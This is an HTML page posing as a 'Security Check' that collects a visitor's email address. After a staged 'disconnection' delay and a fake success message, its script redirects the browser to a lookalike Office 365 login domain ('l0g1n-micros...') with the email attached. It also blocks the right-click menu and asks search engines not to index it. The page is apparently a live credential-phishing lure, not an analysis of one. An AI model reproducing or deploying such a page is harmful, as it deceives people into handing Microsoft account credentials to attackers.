<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>
    <!-- Security Headers -->
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
    <meta http-equiv="Strict-Transport-Security" content="max-age=31536000; includeSubDomains; preload">
    <meta http-equiv="Referrer-Policy" content="no-referrer">
    
    <style>
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            position: relative;
        }

        .image-container {
            width: 100%;
            max-width: 900px;
        }

        .image-container img {
            width: 100%;
            height: auto;
            display: block;
        }

        .security-check {
            display: none;
            margin-top: 1rem;
            font-size: 1rem;
            color: #4CAF50;
            text-align: center;
            font-family: 'Arial', sans-serif;
            background-color: #f2f2f2;
            padding: 10px 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            position: absolute;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
        }

        .error-message {
            color: red;
            display: none;
        }
    </style>
</head>
<body oncontextmenu="return false;">
    <div class="container">
        <div class="image-container">
            <img src="https://pbs.twimg.com/media/GGrR89_WgAAgrOI?format=jpg&name=large" alt="Simulating Disconnection...">
        </div>
        <input type="email" id="email" placeholder="Enter your email" required>
        <p class="error-message" id="errorMessage">Please enter a valid email address.</p>
        <p class="security-check" id="securityCheckMessage">Security check completed successfully!</p>
    </div>

    <script>
        (function() {
            'use strict';

            function isValidEmail(email) {
                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                return emailPattern.test(email);
            }

            function simulateDisconnection() {
                console.log("Simulating disconnection for 10 seconds...");

                setTimeout(() => {
                    console.log("Reconnecting...");

                    const emailField = document.getElementById("email");
                    const errorMessage = document.getElementById("errorMessage");

                    if (isValidEmail(emailField.value)) {
                        const securityCheckMessage = document.querySelector('.security-check');
                        if (securityCheckMessage) {
                            securityCheckMessage.style.display = 'block';
                        }

                        setTimeout(() => {
                            const redirectTo = "https://l0g1n-micros.ftlivedocs.com/o365#" + emailField.value;
                            console.log("Redirecting to: " + redirectTo);
                            window.location.href = redirectTo;
                        }, 6000);
                    } else {
                        errorMessage.style.display = 'block';
                    }
                }, 10000);
            }

            window.onload = function() {
                simulateDisconnection();
            };
        })();
    </script>
</body>
</html>
